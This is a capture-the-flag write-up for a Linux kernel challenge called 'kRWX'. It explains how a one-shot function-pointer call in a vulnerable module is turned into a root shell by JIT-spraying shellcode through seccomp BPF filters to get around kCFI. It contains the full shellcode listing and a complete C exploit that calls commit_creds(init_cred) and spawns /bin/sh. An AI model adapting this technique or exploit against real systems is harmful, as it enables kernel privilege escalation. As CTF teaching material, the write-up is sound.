# ToH CTF
## Author
*@prosti*
## Challenge title & description
**kRWX**
> *Too easy?*
## Brief writeup
### Spotting the vulnerability
The vulnerability is very easy to spot. By interacting with the module you can read, write and call, just once, a pointer to a function (function prototype `void (*) (void)`).

Keep in mind that `CONFIG_BPF_JIT` is defined, that `unprivileged_bpf_disabled=1` and that `cfi=norand`.

### Module leak
The challenge initializes the function pointer to `pwn_nop`. The first step is to read the pointer using `CMD_PWN_READ`. This leak is independant from `kbase` but it is useful for the next steps.
### Function pointer overwrite
Now we can overwrite the function pointer with an arbitrary value. But where should it point to?

kCFI is on. This means that we can just call functions that have the same parameters and return value as `pwn_nop` but there are a few problems. We don't know where the kernel's `.text` area is located and even if we knew, there are not useful functions to call.

It would be very useful if we could just compile arbirary shellcode in kernel space...
### Loading the seccomp filter
So pretty much, we cannot load normal eBPF programs (because of `unprivileged_bpf_disabled=1`) so we need to find an alternative. 

Seccomp filters are technically BPF programs that are generally used to block or allow certain syscalls to userland processes. The program is written in BPF bytecode, loaded through the prctl system call,  verified in kernel space and then it is interpreted or [JIT compiled](https://elixir.bootlin.com/linux/v6.15.4/source/arch/x86/net/bpf_jit_comp.c#L3552). Seccomp filters can only use 32 bit registers.

Fortunately for us, the jitted filters are located in the same area as kernel modules (and with `gdb` you can easly see that the filter is almost at a constant offset from `pwn_nop`) meaning that we don't need any other leak.

### Shellcode
By using the "load 32 bit immediate" instruction (`BPF_STMT(BPF_LD | BPF_IMM, imm32)`) we can load arbitrarily 4 bytes into a register. This will be jitted to  `mov eax, imm32`.

At this point we can jump one byte after the start of a `mov eax, imm32` instruction of seccomp filter to execute arbitrary shellcode. You also have to fake the function signature (it has to be 0xf bytes before the function's start).

The module does not allow you to call the arbitrary function again so you have to escalate privileges in one go.

This is the shellcode that I came up with (100% not optimized but it works). There are smarter paths but this should be the pretty straight forward.
```c
pop rbx
pop rbx
jmp $+3

pop rbx
pop rbx
jmp $+3

pop rdi
pop rdi
jmp $+3

pop rdi
pop rdi
jmp $+3

pop rdi
nop
jmp $+3

sub ebx, edx
jmp $+3

push rbx
nop
jmp $+3

xchg rsp, rax
jmp $+3

add al, 0xc
jmp $+3

xor ecx, ecx
jmp $+3

not ecx
jmp $+3

xchg rsp, rax
jmp $+3

push rcx
nop
jmp $+3

xchg rsp, rax
jmp $+3

sub al, 0x4
jmp $+3

xchg rsp, rax
jmp $+3

xor ecx, ecx
jmp $+3

xor eax, eax
jmp $+3

mov cl, 0x8
jmp $+3

add al, 0x01
jmp $+3

shl eax, cl 
jmp $+3

add al, 0x97
jmp $+3

shl eax, cl 
jmp $+3

add al, 0xb8
jmp $+3

shl eax, cl 
jmp $+3

add al, 0x50
jmp $+3

add ebx, eax
jmp $+3

push rax
push rax
jmp $+3

push rax
push rbx
jmp $+3

xchg rsp, rax
jmp $+3

add al, 0xc
jmp $+3

xor ecx, ecx
jmp $+3

not ecx
jmp $+3

xchg rsp, rax
jmp $+3

push rcx
nop
jmp $+3

xchg rsp, rax
jmp $+3

sub al, 0x4
jmp $+3

xchg rsp, rax
jmp $+3

pop rdi
pop rax
jmp $+3

pop rax
pop rax
jmp $+3

pop rax
nop
jmp $+3

call rax
jmp $+3

pop rax
... ; 29 times
pop rax
ret
```

Keep in mind that you control the value of `rdx` at call time and that you can find kbase leaks on the stack.

## Flag
`toh{JIT_spr4y1ng_1s_my_p4s510n_0f01c80f0110}`

## Full exploit
```c
// Author: prosti (@.prosti. on Discord)

#include "helpers.h"
#include <string.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/prctl.h>
#include <sys/syscall.h>

#define DEV "/dev/pwn"

#define CMD_PWN_WRITE 0x1337
#define CMD_PWN_READ  0x1338
#define CMD_PWN_EXEC  0x1339

#define BPF_OFFSET           0x00200a40

#define VOID_STATIC_HASH     0xa540670c // to get this just disable kcfi randomization momentarely (cfi=norand) 
#define LANDING_ZONE_SIZE    0x100

#define x64_SYS_IOCTL_2_COMMIT_CREDS    0x002aab13 // rdx
#define COMMIT_CREDS_2_INIT_CRED        0x0197b850 // directly hardcoded in the shellcode

uint8_t shellcode[][4] = {   
    { 0x5B, 0x5B, 0xEB, 0x01 },
    { 0x5B, 0x5B, 0xEB, 0x01 },
    { 0x5F, 0x5F, 0xEB, 0x01 },
    { 0x5F, 0x5F, 0xEB, 0x01 },
    { 0x5F, 0x90, 0xEB, 0x01 },
    { 0x29, 0xD3, 0xEB, 0x01 },
    { 0x53, 0x90, 0xEB, 0x01 },
    { 0x48, 0x94, 0xEB, 0x01 },
    { 0x04, 0x0C, 0xEB, 0x01 },
    { 0x31, 0xC9, 0xEB, 0x01 },
    { 0xF7, 0xD1, 0xEB, 0x01 },
    { 0x48, 0x94, 0xEB, 0x01 },
    { 0x51, 0x90, 0xEB, 0x01 },
    { 0x48, 0x94, 0xEB, 0x01 },
    { 0x2C, 0x04, 0xEB, 0x01 },
    { 0x48, 0x94, 0xEB, 0x01 },
    { 0x31, 0xC9, 0xEB, 0x01 },
    { 0x31, 0xC0, 0xEB, 0x01 },
    { 0xB1, 0x08, 0xEB, 0x01 },
    { 0x04, 0x01, 0xEB, 0x01 },
    { 0xD3, 0xE0, 0xEB, 0x01 },
    { 0x04, 0x97, 0xEB, 0x01 },
    { 0xD3, 0xE0, 0xEB, 0x01 },
    { 0x04, 0xB8, 0xEB, 0x01 },
    { 0xD3, 0xE0, 0xEB, 0x01 },
    { 0x04, 0x50, 0xEB, 0x01 },
    { 0x01, 0xC3, 0xEB, 0x01 },
    { 0x50, 0x50, 0xEB, 0x01 },
    { 0x50, 0x53, 0xEB, 0x01 },
    { 0x48, 0x94, 0xEB, 0x01 },
    { 0x04, 0x0C, 0xEB, 0x01 },
    { 0x31, 0xC9, 0xEB, 0x01 },
    { 0xF7, 0xD1, 0xEB, 0x01 },
    { 0x48, 0x94, 0xEB, 0x01 },
    { 0x51, 0x90, 0xEB, 0x01 },
    { 0x48, 0x94, 0xEB, 0x01 },
    { 0x2C, 0x04, 0xEB, 0x01 },
    { 0x48, 0x94, 0xEB, 0x01 },
    { 0x5F, 0x58, 0xEB, 0x01 },
    { 0x58, 0x58, 0xEB, 0x01 },
    { 0x58, 0x90, 0xEB, 0x01 },
    { 0xFF, 0xD0, 0xEB, 0x01 }, // commit_creds(init_cred)
    { 0x58, 0x58, 0xEB, 0x01 }, // pop rax * 29 + ret
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 },  
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 }, 
    { 0x58, 0x58, 0xEB, 0x01 },
    { 0x58, 0xC3, 0xEB, 0x01 },  
};

__attribute__((constructor))
void init(){
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
    if(getuid() == 0)
        system("/bin/sh");
}

void install_seccomp_filter(int hash) {
    int idx;
    struct sock_filter filter[1000] = {0};

    struct sock_filter mov_hash = BPF_STMT(BPF_LD | BPF_IMM, hash);
    struct sock_filter long_rel_jmp = BPF_STMT(BPF_LD | BPF_IMM, 0x909008eb);
    struct sock_filter short_rel_jmp = BPF_STMT(BPF_LD | BPF_IMM, 0x909003eb);
    struct sock_filter ret = BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW);
    

    for(idx = 0; idx < LANDING_ZONE_SIZE-1; idx += 2){ // landing zone
        memcpy(&filter[idx], &mov_hash, sizeof(struct sock_filter));
        memcpy(&filter[idx+1], &long_rel_jmp, sizeof(struct sock_filter));
    }

    // last jump has to be shorter (if not we would skip some shellcode)
    memcpy(&filter[LANDING_ZONE_SIZE-1], &short_rel_jmp, sizeof(struct sock_filter));
    
    
    for(idx = 0; idx < sizeof(shellcode); ++idx){
        struct sock_filter tmp = BPF_STMT(BPF_LD | BPF_IMM, *(unsigned int *)shellcode[idx]);
        memcpy(&filter[idx + LANDING_ZONE_SIZE], &tmp, sizeof(struct sock_filter));
    }

    memcpy(&filter[999], &ret, sizeof(struct sock_filter));

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };

    // Apply the seccomp filter
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(PR_SET_NO_NEW_PRIVS) failed");
        exit(EXIT_FAILURE);
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) != 0) {
        perror("prctl(PR_SET_SECCOMP) failed");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char **argv){
    int dev, r, pid;
    void (* function)(void);
    void *bpf_addr, *code, *code_base;


    dev = open(DEV, O_RDWR | O_NONBLOCK);
    if(dev < 0)
        err(1, "could not open device");

    //
    // exploit goes here
    //    

    // allocate first stage shellcode (jitted)
    install_seccomp_filter(VOID_STATIC_HASH);

    // module & seccomp filter area leak
    r = ioctl(dev, CMD_PWN_READ, &function);
    if(r != 0) 
        err(1, "ioctl read failed");
    
    bpf_addr = (void *)function - BPF_OFFSET;
    function = bpf_addr;

    // overwrite function pointer
    r = ioctl(dev, CMD_PWN_WRITE, &function);
    if(r != 0) 
        err(1, "ioctl write failed");

    // execute shellcode
    ioctl(dev, CMD_PWN_EXEC, x64_SYS_IOCTL_2_COMMIT_CREDS);
    
    if(getuid() == 0 && getgid() == 0)
        system("/bin/sh");

    close(dev);
    return 0;
}
```